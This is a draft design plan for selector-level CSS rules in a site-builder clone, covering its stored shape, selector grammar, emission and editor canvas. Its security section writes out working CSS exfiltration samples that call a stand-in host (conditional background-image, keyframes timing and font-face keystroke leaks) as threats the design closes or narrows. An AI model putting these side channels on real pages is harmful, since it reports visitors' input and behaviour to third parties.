---
type: plan
status: draft
date: 2026-11-02
title: "Selector-level styling: the contract for states, pseudo-elements, keyframes and at-rules"
summary: "How a node stores CSS that needs a selector or an at-rule, so it composes with breakpoints, stays scoped to its node, shows on the canvas and works without JavaScript. A new `props.rules` list whose declarations are ordinary style maps, one strict selector grammar, no external address inside a rule, one reserved name prefix, a canvas that never reacts to the real pointer, and hover presets as shared rules with no data migration. Revised after an independent review. Ten slices closing 140 rows of the score."
tags: [framer-clone, primitives, css, selectors, responsive, renderer, fleet]
projects: [framer-clone]
---

# Selector-level styling

This is step 4 of the [complete primitives plan](2026-11-01-complete-primitives.md) and layer 1 of its
"Visual state management": Normal, Hover, Pressed and Focused compiled to plain CSS, so hover works
without JavaScript. It covers the score rows that need a selector, an at-rule or a media feature:
118, 15 and 34 rows of [the score](../primitives-score/latest.md). Component states and page state
(layers 2 and 3) are not here; they will build on this format.

Read against commit `59a64d6`, after the widened matrix (1,844 rows). Revised after the independent
review of 2026-11-02 (`~/software-dev/decision-pages/2026-11-02-selector-styling-review.md`), whose
findings F1 to F14 are applied here. "Review findings not adopted" lists what was changed or declined,
with the evidence.

## The decisions

1. **A new prop, `props.rules`, an ordered list beside `props.style`.** The same pattern as
   `props.effects` (motion plan, decision 1). Not nested in `style`, because every reader of `style`
   assumes "scalar or responsive map".
2. **Declarations inside a rule are an ordinary style object,** with the same
   `{ base, <breakpointId>: value }` maps. So Hover at Tablet needs no second cascade:
   `resolveCascade`, `writeCascade` and `declarationsAt` apply unchanged.
3. **A stored selector always starts with `&`, the node itself,** and its subject cannot leave the node.
   Text that does not parse is dropped whole, never partly applied.
4. **The render step is the trust boundary.** Save and publish keep the page as opaque JSON, so one pure
   parser runs at emission in every renderer, and again in the panel, the AI validator and the import.
5. **A node with an authored rule moves its styles into the sheet,** as a responsive node already does,
   because inline style beats any selector. **A value the sheet refuses stays inline,** alone and with the
   warning, so moving never loses a value. A preset never triggers this.
6. **No external address inside a rule or a definition.** A rule makes a request conditional, which a
   plain style never could, so a rule cannot hold the address. See the residual risk below.
7. **Global names carry a reserved prefix, `u-`.** Keyframes and the like are global to a document, and
   on the canvas that document is the editor itself. Names are not rewritten at render time.
8. **The canvas never reacts to the real pointer or the editor's environment.** A state, a print rule or
   a dark rule shows there only when the panel previews it. Structural rules and pseudo-elements always
   show, and the editor's own inline behaviour is out of a rule's reach.
9. **Hover presets stay stored as `effects.hover` and become one shared rule per kind.** No data
   migration, no change to any saved page. Appear and scroll stay what they are, because their trigger is
   a runtime.

## The stored shape

```ts
/** props.rules: order matters, a later rule wins a tie. Absent when empty. */
type StoredRule = SelectorRule | DefinitionRule;

interface SelectorRule {
  id: string;               // short, unique within the node, never emitted
  selector: string;         // starts with `&`: `&:hover`, `&::before`, `& > li`
  at?: string[];            // wrappers, outermost first: `@media (prefers-color-scheme: dark)`
  style: Record<string, unknown>; // exactly the shape of props.style
}

interface DefinitionRule {
  id: string;
  define: string;           // the whole prelude: `@keyframes u-spin`, `@font-face`
  style?: Record<string, unknown>; // descriptors, plain values only, no responsive maps
  blocks?: { selector: string; style: Record<string, unknown> }[]; // `from`, `50%`, `@styleset`
}
```

`rules` is also a legacy `<table>` attribute name. Only an array is a rule list: every reader checks
`Array.isArray`, and a stored string stays the attribute it is today.

A hover that differs on Tablet, on a node `a1` with the default breakpoints:

```json
{
  "style": { "color": { "base": "#111", "tablet": "#222" } },
  "rules": [{
    "id": "r1",
    "selector": "&:hover",
    "at": ["@media (hover:hover) and (pointer:fine)"],
    "style": { "color": { "base": "#00f", "tablet": "#0a0" } }
  }]
}
```

```css
.fc-a1.fc-a1{color:#111}
@media (max-width:1279.98px){
.fc-a1.fc-a1{color:#222}
}
@media (hover:hover) and (pointer:fine){
.fc_r-a1.fc_r-a1:hover{color:#00f}
}
@media (max-width:1279.98px){
@media (hover:hover) and (pointer:fine){
.fc_r-a1.fc_r-a1:hover{color:#0a0}
}
}
```

The node carries two classes: `fc-a1` for Normal and `fc_r-a1` for its rules. See emission for why they
are separate. The underscore means a rule class can never equal `fc-<stem>` for any node id.

The value of a property in a rule on a breakpoint is the first defined of:

1. `resolveCascade(rule.style[key], breakpoint, breakpoints).value`
2. the same, for each rule the state implies (Pressed implies Hover, see below)
3. the same, on `style[key]` (Normal)

State first, then breakpoint: a Hover set on Desktop reaches Tablet even where Normal has a Tablet
override, and a Hover with no value for a property shows Normal's. The sheet produces the same answer by
itself. The formula is per key, so the panel's grey row looks through a small table of the shorthands
its own rows use (`padding`, `margin`, `inset`, `gap`, `border`, `borderRadius`, `background`, `font`).

This retires the score's two trial encodings in `test/score/lib/encodings.ts`, the nested key
(`{ [rule]: {...} }`) and the state key inside a value map. The second would have fought the cascade:
`isResponsiveMap` is false for a map holding only a state key.

### The named states

Constants in `src/lib/rules/states.ts`. A state is nothing but a rule the panel knows how to name.

| Panel | selector | at | Implies | Why |
|---|---|---|---|---|
| Hover | `&:hover` | `@media (hover:hover) and (pointer:fine)` | none | A tap would otherwise leave hover stuck on a phone. The motion plan's gate |
| Focused | `&:focus-visible` | none | none | Keyboard focus, without an outline after a mouse click on a button |
| Pressed | `&:active` | none | Hover | Last, because pressing also hovers. A pointer press shows Hover's values plus Pressed's |

The model keeps named states in that order at the start of the list; authored rules follow. Pressed
must win across widths too, which is why rules are emitted grouped by rule. Previews and the panel read
the implied set from `states.ts`, so the rule is written in one place.

## Every reader that has to learn it

| Reader | What it does with `rules` |
|---|---|
| `ComponentModel.getResolvedProps` | Skips an array, like `effects`. Otherwise it would become a DOM attribute |
| New model actions | `setRuleStyle`, `addRule`, `removeRule`, `moveRule`: one action, one undo step, frozen `props` replaced whole, `writeCascade` for values, an emptied rule removed, an empty list deleted so saved pages stay unchanged |
| `applyResponsiveStyles` | Issues the rule class keyed on `rules` alone, moves Normal to the `fc-` class, removes `props.rules` from the tree. A text node is skipped: it has no element |
| `buildResponsiveCss` | The one emitter. Takes `rules` on `ResponsiveRuleInput` and a `surface` option (published, canvas, preview). Rewrites for the two editor surfaces live in `src/lib/rules/surfaces.ts` |
| `renderComponentNode` (`NON_DOM_PROPS`) | Denies an array defensively, as it does `effects` |
| `createComponentElement` | No change: it only sees `finalProps` built from `getResolvedProps` |
| `snapshotToComponentNode`, `hydrateBindings` | Pass it through. A cloned row carries its rules. A `{{binding}}` in a rule value contains `{` and is refused: bindings do not reach rules |
| `applyEffects` | Replaces `data-fx-h` with a mark on the node, which `applyResponsiveStyles` turns into the preset's shared class, see migration |
| `collectPageFonts` (`fonts/registry.ts`) | Also scans `rules[].style`, or a family used only on Hover is never loaded |
| `yjsDocShape.ts` | No change. Multiplayer has not shipped, and `rules` falls through as plain JSON. The real shape is chosen when multiplayer lands |
| `validate.ts`, `ai/review/ops.ts` | Accept through the parser and `style()`, see AI |
| `roundtrip/jsx.ts` | A named prop, like bindings, see export |
| Text nodes, blocked tags | A text node has no element: the model refuses rules there and the emitter skips them |

## Selector grammar

One pure, client-safe module, `src/lib/rules/rules.ts`, with a small tokenizer in the manner of
`isContainedValue`. No new dependency: the check is a short list of refusals, and it must run in the
browser.

A stored selector is a comma-separated list. Every part:

- starts with `&` as its first character, followed by `:`, `[`, `.`, `#`, a combinator, whitespace or the
  end, and has no other `&`. Substitution would turn `&div` into `.fc-a.fc-adiv`, a different class;
- is at most 256 characters, with brackets, parentheses and quotes balanced and nesting at most 8;
- holds none of `{ } < ; @ \`, no control character, no `/*`, no `url(`;
- has no top-level `+`, `~` or `||` directly after the first compound, so `& + p` and `&:hover ~ p` are
  refused. `& h2 + p` is fine: it stays inside the node;
- has no class or attribute value starting `fc-` or `fc_`, compared without regard to case. This protects
  stability, not safety: those names change on duplicate. `[class*="c-a1"]` gets past it and only narrows;
- has no attribute selector on `value` with an operator, however it is written: `[VALUE^="a"]`,
  `[*|value^="a"]`, `[|value^="a"]`, `[ value ^= a ]`, `[value="abc"]`, `[value="ABC" i]`. The tokenizer
  reads the attribute's name and namespace rather than matching text. See the safety section.

Pseudo-classes and pseudo-elements are checked by shape, not against a list, so new CSS works without a
code change. Normalising is the job of what writes a rule, never of the emitter: the panel and the
import turn `:hover` into `&:hover` and `h2` into `& h2`.

`>` is allowed although the value check refuses it: only `</style` can close the element, and that
needs a `<`.

**What the node's scope does and does not give.** The first compound is always the node, and only child
and descendant steps can leave it, so the subject of every emitted selector is the node or something
inside it. A condition is another matter: `:is()`, `:not()` and `:has()` may read the whole document.
`&:is(html:has(select option:nth-child(3):checked) *)` passes the grammar, and that stays allowed:
`&:is(.group:hover *)` and `&:is(.dark *)` are how Tailwind's `group-hover:` and `dark:` land on import.
Reading is harmless only while nothing can report what was read, which is the next section.

## What "safe in a multi-tenant stylesheet" means here

The sheet is per page and rendered per request into that site's own HTML, so tenant A's text never
reaches tenant B's visitors. That stays true only while nothing authored goes into a shared file. If
the sheet ever moves to a cached asset, its key must hold the site and the publish version.

| Threat | Answer |
|---|---|
| Closing the `<style>` element (`</style><script>`), which is script on a published site | `<` is refused in selectors and preludes, and in values outside a verified string. Inside one the emitter writes `\3c `, so the output never holds a `<`. A range comparison in `@media` or `@container` is the one `<` read rather than refused, see at-rules, and it does not reach the output either. `dangerouslySetInnerHTML` writes the text raw, so this check is the one that matters |
| Escaping the rule or the declaration | `{ } ; \` refused, comments refused. Declarations go through the existing `declaration()`, so `isContainedValue` and `UNSAFE_VALUE` apply unchanged |
| Restyling the editor, because the canvas shares a document with it | Subjects stay in the node, and global names need the `u-` prefix. Tailwind's `animate-spin` is an editor keyframe called `spin`; a stored `@keyframes spin` would have replaced it |
| Breaking the editor on the canvas (a node that cannot be clicked, a locked node that can) | The canvas sheet never emits editor-owned properties, see the canvas |
| Reporting what a visitor does through a conditional request | See below: closed inside rules, with one residual route |
| Loading from a third party through `@font-face` (a visitor's address reaching a foreign host, the German font rulings) | Covered by the same address check |
| Registering a type for a platform variable | `@property` takes `--u-` names only, and `syntax` is a constant lookup from a fixed list, never stored text, so it bypasses `declaration()` rather than widening what it allows. Its `initial-value` takes the address check |
| A huge page | At most 64 rules per node, 2,000 emitted rules per page counted after rows share a rule class, and 256 kilobytes of rule text per page. One `data:` font can be megabytes, so the rule count alone would not do. Beyond that, later rules are dropped with the warning below |

Selectors do not protect the consent banner, and they never did: a plain inline `position:fixed; inset:0`
with a high `zIndex` covers it today. That exposure is unchanged by this plan and is not answered here.

**External addresses.** A rule makes a request conditional. These all fired a real request in Chromium
in the review, with the grammar above satisfied:

- `&:has(input:checked){background-image:url(https://evil.test/x)}`
- `&:has(input:checked){background-image:image-set("https://evil.test/x" 1x)}`, a bare string
- Normal holding `--x:url(https://evil.test/x)` and the rule holding `background-image:var(--x)`

So, with no back-compat cost, because rules are new:

1. In every rule body, block and definition, inside `url(`, `image-set(`, `-webkit-image-set(`, `image(`,
   `src(`, `cross-fade(` or `-webkit-cross-fade(`, compared without regard to case, any address is
   refused unless it is a site path with one leading `/`, or `data:`. `local()` is refused in `src`, see
   below. Plain strings outside those functions are text: `content:"https://example.com"` is fine.
2. A custom property holding such a function with an external address is dropped at emission, on any node
   of a page that has an authored rule, with the warning. A preset is not an authored rule, and no saved
   page has one, so nothing regresses at deploy. The panel reports it the moment the first rule is added.

**The residual route, proven.** A rule needs no address if Normal already holds one. A hidden element
with a Normal `background-image:url(https://evil.test/x)` and a rule that sets `display:block` on it sent
no request on load and one the moment a checkbox was ticked (Chromium, 2026-11-02). Normal hot-linking is
ordinary content, a stock photo for example, so refusing it would break real pages. Only a browser-enforced
policy closes this, which is open question 1. Inside the editor the same route can read editor attributes,
so the question covers the editor host too.

**Definitions add a timing switch to that route, proven.** `@keyframes u-sw{to{--off:initial}}` with
`animation:u-sw 0.01s 300ms forwards` on a Normal holding `var(--off, url(https://evil.test/x))` sent nothing
at 100 milliseconds and fired by 600 (Chromium, 2026-11-02). So a stored page can report how long a visitor
stayed, and with a scroll timeline probably how far they read (not run). A rule needs a visitor's action to
fire; this needs none. It is a new form of the route, and only the policy in open question 1 closes it.

**What a visitor types, read through a width, narrowed and not closed.** A stored `@font-face` with a huge
`size-adjust` per character, on an input with `field-sizing:content` beside a container query, sent one
request per character typed, with no selector touching `value` (Chromium, 2026-11-02). So a control may not
size itself to its text on a page with a stored rule or definition: the sheet ends with the constant
`input,textarea,select{field-sizing:fixed!important}`, a rule refuses `fieldSizing`, and Normal loses it, under
its own key or smuggled after a `;`, because either would outrank the constant. Other ways to measure a value
are not ruled out, so this narrows the route, and an enforced policy closes it.

**What is installed.** `local()` is refused in `src`: whether a face resolves, measured the same way, told a
third party a font was present. Site paths and `data:` stay. A Normal `fontFamily` naming an installed font can
still be measured the same way (read, not run), which is the same route and the same policy.

That is why typed text keeps its own refusal: the `[value...]` rule above stops a selector reading what a
visitor types, which React mirrors into the attribute for a controlled input. What is selected or ticked
stays readable through that residual route until the policy question is answered.

**Refused means dropped whole, and visible.** A rule that does not parse is not emitted. The page still
serves, `applyResponsiveStyles` warns once per page as it does for a dropped declaration, and the panel
shows the rule with its reason. A bad rule never blocks a publish.

## At-rules

`at` has an explicit allow list: `@media`, `@supports`, `@container`, `@scope`, `@starting-style`. Any
other name is refused, `@import`, `@namespace`, `@charset` and `@layer` included. `define` has the
allow list below. A name in the table must match `u-[a-z0-9-]+`, with `--` in front where CSS requires a
dashed name.

| At-rule | Kind | Stored as | Limits |
|---|---|---|---|
| `@media` | Wrapper | `at` | Prelude text checked like a selector, `url(` refused. A range comparison holding `<` is rewritten first, see below |
| `@supports` | Wrapper | `at` | Same, with no range comparisons |
| `@container` | Wrapper | `at` | Same as `@media` |
| `@scope` | Wrapper | `at` | Prelude selectors are read-only conditions, checked by the same rules without the `&` |
| `@starting-style` | Wrapper | `at` | No prelude |
| `@keyframes` | Definition | `define`, `blocks` | `u-` name; block selectors `from`, `to` or percentages; at most 256 blocks |
| `@font-face` | Definition | `define`, `style` | `fontFamily` must be `u-`; `src` takes site paths and `data:` only, `local()` refused |
| `@font-feature-values` | Definition | `define`, `blocks` | `u-` family; blocks are the feature keywords |
| `@font-palette-values` | Definition | `define`, `style` | `--u-` name |
| `@counter-style` | Definition | `define`, `style` | `u-` name |
| `@property` | Definition | `define`, `style` | `--u-` name; `syntax` from a fixed list (`"<color>"`, `"<length>"`, `"<number>"`, and so on) |
| `@position-try` | Definition | `define`, `style` | `--u-` name |

**Range comparisons.** Tailwind's `max-md:` compiles to `@media (width < 48rem)`, and CSS has no escape for a
`<` outside a string, so refusing the character would refuse real imports. The parser reads the comparison
and swaps its sides: `(width < 600px)` becomes `(600px > width)` and `(400px <= width < 600px)` becomes
`(600px > width >= 400px)`, which CSS defines as the same query, unknown features included, where a
`not` would differ. Only a bare parenthesis or `style()` qualifies, with terms of plain characters and
operators that point one way. The ordinary prelude check then runs on the result, so a `<` in any other
shape is still refused, and the emitter and its guards never see one. `props.rules` keeps what was typed:
only the parsed rule holds the swapped text, so a slice reading `at` from the parser sees the `>` form.

**Not stored on a node:** `@layer`, `@page` and `@view-transition`.

- `@layer` as a wrapper is refused because the surfaces would disagree. Normal is unlayered and beats any
  layer whatever the specificity, while the canvas's `!important` wins regardless: in Chromium the same
  rule computed `rgb(1, 1, 1)` published and `rgb(9, 9, 9)` on the canvas. Keeping it would need Normal in
  a layer, which breaks "byte for byte".
- `@page` and `@view-transition` apply to the document. `:root` is left to page-level items for that very
  reason, so these go there too. This also removes a "never on the canvas" exception.

A definition lives on a node so it travels with that node on copy, on duplicate and later inside a
reusable component. Its effect is the document: any node may reference the name.

**Why a prefix rather than rewriting names per node.** Rewriting would need a value parser per property
(`animation`, `listStyle`, `fontFamily`, and more), would break a reference from another node's inline
style, and would make `@keyframes u-spin` two different things on one page, where a shared keyframe is
the whole point. A prefix gives the same safety against the editor and the platform with no render-time
rewriting.

**Identity, for duplicates.** Regular and Bold of one family are two `@font-face` rules, so "one name" is
not one identity.

| At-rule | Identity |
|---|---|
| `@font-face` | Family, weight, style, stretch and `unicode-range` |
| All others | The name |

Identical definitions dedupe. Otherwise the first in walk order wins, the rest are dropped with the
warning, and the panel refuses the clash when it is typed. A definition sits on a node, so one inside a
collection with no rows, or on a deleted node, stops existing while other nodes still reference it. The
panel warns on a referenced name that no node defines.

## Row decisions

Every row is encoded, excluded with a reason, or left as an honest failure.
`test/score/data/exclusions.json` gets 12 rows, all failing today, so no passing cell is lost.

| Rows | Decision | Reason to write |
|---|---|---|
| `:host`, `:host()`, `:host-context()`, `:has-slotted`, `::slotted()`, `:state()` (6) | Excluded | They need a stylesheet inside a shadow tree (`style` is a blocked tag) or a custom element's script, and a node can author neither. Custom code is the route that could bring them, and these rows return with it |
| `Column combinator`, `:blank`, `:local-link`, `:target-within`, `::cue-region`, `::cue-region()` (6) | Excluded | Neither Chromium nor WebKit parses the sample (checked 2026-11-02), the same kind as `image()` and `element()`. The browser probe fails when that changes |
| `:root`, `::view-transition`, `::view-transition-group()`, `::view-transition-image-pair()`, `::view-transition-new()`, `::view-transition-old()`, `:active-view-transition`, `:active-view-transition-type()` (8) | **Stay failing** | The route owns `html`. "Page-level items will do them" is a schedule, not a reason to exclude. New gap `page-level-css` in `lib/types.ts` |
| `:first`, `:left`, `:right`, `@page`, `@view-transition`, `@layer` (6) | **Stay failing** | Same gap: see at-rules. `@layer` belongs beside the ordering statement |
| `::part()` | Encoded | `template.shadowrootmode` passes on all three surfaces, so a node can hold a declarative shadow root, and `.fc-a.fc-a::part(x)` styles a part in it in Chromium |
| `:buffering`, `:stalled`, `:seeking`, `:muted`, `:paused`, `:playing`, `:volume-locked` (7) | Encoded | Chromium refuses them and WebKit parses them. They are real CSS Safari renders, so they are listed as WebKit-only in `samples.json`, and the Chromium check skips them, failing if Chromium starts to parse one |
| `::cue`, `::cue()` | Encoded | Live on a `video` node with a track |
| `:scope` | Encoded | Live inside `@scope`, so it closes with the wrappers |
| All others | Encoded | Normal rows |

Slice 1 extends `matrix.browser.score.ts`, so Chromium must keep each sample in its parsed stylesheet, as
it already proves value samples valid.

## Emission on the published page

`buildResponsiveCss` keeps its output byte for byte for a node without rules. The sheet becomes:

1. **Definitions,** first, deduped, in walk order. They have no breakpoint axis and no `at`.
2. **Today's blocks,** Normal per breakpoint, unchanged.
3. **Shared preset rules,** once each, only for the kinds on the page, at the place and specificity
   `EFFECTS_BASE_CSS` has today. See migration.
4. **Authored rules, grouped by rule rather than by breakpoint:** for each rule class in walk order, for
   each selector rule in stored order, its base block, then each breakpoint's own values. This is
   `declarationsAt` again, with the rule standing in for the node. Adjacent blocks with identical wrappers
   merge, which keeps order and saves bytes.

Grouping by rule keeps Pressed above Hover. In today's grouping, a Tablet Hover would land after a
Desktop Pressed and, having equal specificity, beat it while pressing.

**Nesting.** The breakpoint query is outermost, then `at` in stored order, each on its own line, then
the selector. Nested rather than merged into one `@media ... and ...`, because `at` also holds
`@supports` and `@container`, which cannot merge.

**A list becomes one rule per part.** A browser throws away a whole list for one selector it does not
know, so `&::picker(select), &:hover` must not lose its hover in Firefox. The declarations repeat, and
that is cheap.

**The rule class is separate from Normal's.** The dedupe signature in `classFor` covers Normal, so a row
template with one bound image would issue one class per row. Rules go on `fc_r-<stem>`, keyed on `rules`
alone, so 500 rows with one template share one rule block, and the page's cap does not depend on how many
rows the content has. With two classes on the element, `.fc_r-a1.fc_r-a1:hover` is (0,3,0) over
`.fc-a1.fc-a1` at (0,2,0), and a rule such as `&` alone ties at (0,2,0) and wins by coming later.

**A rule beats Normal on whatever it reaches, in every renderer.** Which takes two things on this page:

- A node with authored rules moves its styles into its class (decision 5).
- A selector reaching a descendant, such as a card's `&:hover h2`, is worthless against the title's
  inline colour. So `visit` gets a flag: under a node holding such a rule, every element with a style
  moves to a class too. Specificity then behaves as in plain CSS: `.fc_r-p.fc_r-p:hover h2` outranks
  `.fc-c.fc-c`, and the child's own `.fc_r-c.fc_r-c:hover` outranks `.fc_r-p.fc_r-p h2`.

Exceptions, stated: a value the sheet refuses stays inline and so beats a rule, which is the visible
failure this contract prefers to a lost value. Renderer-owned inline styles (the sticky bar's `linkStyle`,
the commerce placeholders) cannot move either. A parent's `& h2` beats the child's own Normal, as in any
CSS, and the child's panel row does not know: this is plain CSS behaviour, stated here, not detected.

**Moving no longer means losing.** `declaration()` refuses more than React's inline path does, which makes
the header of `responsiveCss.ts` wrong ("never changes what it means"). Stored values such as an unescaped
`url("data:image/svg+xml,<svg .../>")`, `gridTemplateAreas` over two lines, or `content:"\201C"` reach the
page inline and are dropped from the sheet. So:

- When a move would refuse a declaration, it stays inline, alone, with the warning. A refused responsive
  map keeps its `base` there and loses its breakpoints, which the warning names.
- The sheet widens where the emitter owns the output: inside a string `isContainedValue` has verified, `<`
  is written `\3c ` and a newline `\a `, and a tab or newline between tokens becomes a space. Backslashes
  stay refused.
- This applies to moves caused by rules. A node that is only responsive keeps today's behaviour, by the
  security review of pull request 221: the refused value is dropped and its overrides stay, because a page
  nobody touched must not change at deploy. The widened strings reach it all the same, which is the one
  change a rule-free page sees: a value the sheet could not hold before and now holds escaped.

**Structural selectors differ at the page root.** `renderPublishedPage` renders several `<style>` and
`<script>` siblings beside the root, so `&:first-child` on the root does not match there, and
`hoistStickyCta` moves the bar to the end, which changes `:last-child`. Narrow enough for a panel note on
the root node.

## The canvas

The canvas shares a document with the editor, and its frames are not viewports, so the published sheet
cannot simply be reused. `buildResponsiveCss` takes `surface: 'canvas'`.

**One sheet at the canvas root,** `CanvasRuleStyles` beside `PageFontFaces` in
`ResponsivePageRenderer`, not per node. A `<style>` next to an element would count as a sibling and
shift `:nth-child` and `:first-child`, the rows it is meant to show. It lists each node once per frame,
and floating elements, whose identity has an empty breakpoint. Each node's text is memoised, so a rule
edit rebuilds one entry; the cost of rewriting one sheet (a style recalculation across the editor) is
measured in slice 6, not assumed.

| Published page | Canvas |
|---|---|
| `.fc_r-a1.fc_r-a1` | `[data-viewport-content-id] [data-component-id="tablet-a1"]`, the copy in one frame, or `[data-floating-root-id] [data-component-id="-a1"]`. The root is needed: the preview overlay shares the document and renders the same ids |
| One block per breakpoint in a media query | Values resolved for that frame by `resolveCascade`, with no query |
| Real `:hover` | Dead unless previewed (below) |
| Moves Normal into the class | Normal stays inline, every rule declaration gets `!important` |
| `@keyframes` run | Defined, and neutralised (below) |

`!important` gives the same result as the published page, where a rule also beats Normal, without
touching the canvas's inline path. A stored `!important` is stripped first, or the doubled text is
invalid and the rule vanishes on the canvas only. Ids that are not `[A-Za-z0-9_-]` are skipped with the
warning, so an id cannot break the attribute string.

`!important` also beats an animation, which the published page's rule does not. So a rule that starts an
animation keeps the properties a keyframe on the page moves at their normal weight: `{opacity:0;animation:
u-reveal 1s forwards}` would otherwise stay hidden on the canvas, and on `::before`, which has no Normal to
carry the start state, it is the only way to write a reveal. A property set by one rule and animated by
another still shows the rule's value, an accepted edge. The page caps scale by the number of frames, so a
page the published sheet holds whole is not cut on the canvas.

**Editor-owned properties are never emitted on the canvas:** `pointer-events`, `user-select`,
`-webkit-user-select`, `-webkit-touch-callout` and `cursor`, listed in `surfaces.ts` with a test for each.
Slice 6 added three that do the same damage, each proven necessary on the mounted editor: `all`, which
resets every one of those, `interactivity`, whose `inert` takes a node out of hit testing with
`pointer-events` untouched, and `-webkit-user-modify`, which turns a contentEditable box read only.
`!important` beats inline, and `ComponentRenderer` writes these inline so a node can be selected, a locked
node cannot, and inline text editing works. In Chromium a rule `pointer-events:none!important` over inline
`auto` made a node unclickable, and Radix and shadcn output is full of those rules. These properties work
on the published page; the canvas just never shows them.

The same list applies inside a `@keyframes` block on the canvas. An animation beats inline style without
any `!important`, and the neutraliser below holds a `forwards` animation at its end, so
`@keyframes u-lock{to{pointer-events:none}}` would otherwise lock a node for the editor. In Chromium a
keyframe set `pointer-events:none` over inline `auto` with no `!important`, so stripping needs the same
spellings as the rule list. The constant that ends a published sheet stays off the canvas: its selector would
fix the editor's own fields. Definitions share the page's rule budget, so 2,000 of them leave nothing for a
later Hover, which is dropped with the warning and costs only that page. This emitter is the one to reuse: its
guard already refuses an external address in a hand-built definition.

**The real pointer does nothing.** `:hover`, `:active`, `:focus`, `:focus-visible` and `:focus-within`,
in any case, are rewritten by the tokenizer, wherever they stand, including inside `:is()`. Dead, each
becomes `:not(*, :hover)`: it never matches and keeps the original's specificity. A plain `:not(*)` would
lose a tie against `&:first-child` that the published page wins. Otherwise a card would jump while someone
tries to select it, and pressing to drag would show Pressed. State reflected in the document (`:checked`,
`:disabled`, `:empty`) stays real and shows.

**A stored page cannot read the editor.** The security review of slice 6 proved that `&:is(html:has([data-x*="a"]) *)`
over a Normal external background reports the signed-in editor's attributes to a third party. So on both
editor surfaces, any functional pseudo-class but `:has()` holding a complex selector, at any depth, is written
`:not(*, <it>)`, or `:is(*, <it>)` when previewed. Each has one result whatever the document holds, and the
specificity of what it stands for. A compound argument and `:has()` on the node stay real, since they read the
stored page. The published page is untouched, so `.dark` and `group-hover` work there, and on the canvas they
show when previewed. The preview has no way to preview a rule, so they stay dead in it. A Normal custom property
holding an external address, which the published filter drops, is cleared by the sheet here on a page with a rule.

**Conditions on the canvas.** The editor's window and system are not the frame's.

| Condition | On the canvas |
|---|---|
| `width`, `height`, `aspect-ratio`, `orientation` with constant numbers, plain or `min`/`max` or in range form, where the name may stand on either side because the parser swaps a `<` | Evaluated against the frame's own size when the sheet is built: the block is written or omitted. Tailwind's `lg:` then stays out of the Mobile frame. A number is `px`, or `rem` at 16px, because Tailwind 4 compiles `lg:` to `(width >= 64rem)` |
| A width query that cannot be evaluated (`em`, `calc()`, `or`) | Omitted unless previewed, with a note on the rule's row. `mediaVerdict` tells this case apart for that note, which arrives with the rows in slices 7 and 8 |
| Media types and all other media features: `print`, `prefers-*`, `hover`, `pointer`, `forced-colors` and the rest | Dead until previewed, like the pointer states. `screen` and `all` are true |
| `@supports`, `@container`, `@starting-style` | Real |
| `@scope` with a prelude | Dead until previewed, and then live with the prelude removed. Its root is matched against what is above the node, which is the editor |

A floating element has no frame, so its conditions read the largest frame, which is also how its values
resolve (`resolveCascade` reads an empty breakpoint as the largest).

**Previewing is per rule, and it is general.** `EditorUIStore` gets a volatile
`previewRule: { componentId, ruleId } | null`. The sheet expands it through `states.ts` into a set, so
previewing Pressed activates Hover too. For each rule in the set, and for the hover preset on Hover, the
five pseudo-classes are written `:is(*, :hover)`, which matches and keeps the specificity, and its
environment wrappers are removed. So Hover, a dark rule and a print rule are all shown the same way. It
applies to every copy of the node, so each frame shows its own breakpoint's value and Hover at Tablet can
be compared with Hover at Desktop side by side. A selection outline stays around the node and a small
badge beside it names the state; the badge needs something that sets `previewRule`, so it comes with the
state switch in slice 7. A hover preset keeps its normal weight when previewed, because it also loses to an
inline value on the published page.

**Animations stay at rest.** After the rules, for `*`, `*::before` and `*::after` under both
`[data-viewport-content-id]` and `[data-floating-root-id]`:
`animation-duration:0s!important;animation-delay:0s!important;animation-iteration-count:1!important`, with
the root repeated so it ties a stored timing on `&` and wins by coming last. That
gives a `forwards` reveal its end state and an infinite one its rest (proven in the review), where
`animation:none` would leave a Normal `opacity:0` invisible and `*` alone would miss pseudo-elements. A
stored animation timing with a higher specificity still runs, an accepted edge. A node whose rule is
previewed skips this, which is how a keyframe is played.

### The preview surface

`PreviewFrame` shows one breakpoint inside a `div`, so media queries on width cannot work there either.
`surface: 'preview'` scopes to `[data-preview-frame]`, evaluates width conditions against the frame, keeps
real pseudo-classes and real environment conditions, and does not neutralise animations. Hover presets
use the same shared classes as the published page. The editor-owned list does not apply, because a
preview has no selection. The start-state rules stay where they are. The field-sizing constant ends this
sheet too, scoped to the frame, so a control measures as it does when published.

## The panel

**State switch.** A row at the top of the right sidebar, under the selection's name: Normal, Hover,
Pressed, Focused, and `+`. A dot marks a state that holds values. It writes a volatile `activeRule` on
`EditorUIStore`, beside `selectedViewportNode`, and sets `previewRule`. It resets to Normal on another
selection, and it is hidden for several selected nodes, a text node and viewport nodes.

**One hook, not sixty call sites.** Size, Position, Layout, Typography, Styles and Image each define
`getStyleValue`, `setStyleValue` and `src` in three local lines. These become
`useStyleTarget(component, breakpointId)`, which reads `activeRule` and routes to `updateResponsiveStyle`
or `setRuleStyle`. The general Custom section of the goal `fleet-general-editor` uses the same hook, so any
property works in any state.

**What a row shows in a state.** A value set in this state is normal text with a dot reading "set in
Hover", whose reset removes it. An unset row shows the inherited value greyed, reading "from Hover" where
Pressed inherits it and "from Normal" otherwise, and typing there creates the rule on the first edit, not
on the switch, so clicking through states leaves nothing behind. The existing breakpoint source applies
inside a state as well.

**What does not follow the state.** Text, Link, Form, Sticky bar and Data sections hold props rather
than styles, so they are dimmed with "Editing Hover. Back to Normal". Effects stays available: its Hover
preset row is a shortcut. The canvas resize handles, spacing handles, `quickbar/actions.ts` and
`QuickToolbar` all write Normal, so they hide while a state other than Normal is active. A drag cannot
silently edit the wrong state.

**Custom rules.** `+` opens one text field that takes a selector (`:nth-child(2n)`), or a whole CSS rule
pasted in, at-rule included, through `parseCssText` in `rules.ts`. On failure it says why and stores
nothing. Each custom rule then appears in the switch as a row of its own and is edited with the normal
sections. Definitions open as text, since a keyframe list has no meaning in a size field: a keyframes
timeline is a later product question, not part of this contract.

**Unhappy and re-entry paths** (the stateful flow standard):

- Forward: pick Hover, set a colour, see it on the canvas and on the published page.
- Backtrack: clearing the last value removes the rule, and the dot goes; a change of breakpoint keeps
  the state; deleting the active rule returns to Normal.
- Resume: `activeRule` is volatile, so a reload opens on Normal, with every rule intact.
- Re-entry: undo past the rule's creation returns to Normal rather than pointing at nothing, the same
  for the selected node vanishing, for a collaborator deleting the rule, and for a rule that was refused
  (shown with its reason, editable, and deletable).

Touch and keyboard: the switch is a `radiogroup` with arrow keys, and the phone editor shows it at the
